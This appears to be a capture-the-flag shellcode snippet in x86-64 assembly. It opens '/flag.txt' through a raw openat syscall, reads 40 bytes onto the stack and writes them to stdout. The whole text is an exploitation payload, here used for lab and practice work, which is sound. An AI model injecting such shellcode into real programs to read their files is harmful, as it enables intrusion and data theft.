open:
    mov rax, 0x101  

    mov rdi, 0 
    dec rdi

    mov rbx, 0x0000000000000074
    push rbx
    mov rbx, 0x78742e67616c662f
    push rbx

    mov rsi, rsp 

    mov rdx, 0  

    mov r10, 0 

    syscall 

read: 

    mov rdi, rax

    mov rax, 0x0

    mov rbx, 0x0 
    push rbx
    push rbx 
    push rbx
    push rbx 
    push rbx


    mov rsi, rsp
    mov rdx, 0x28


    syscall 

write: 
    mov rax, 0x1 
    mov rdi, 0x1
    mov rsi, rsp 
    mov rdx, 0x28

    syscall 


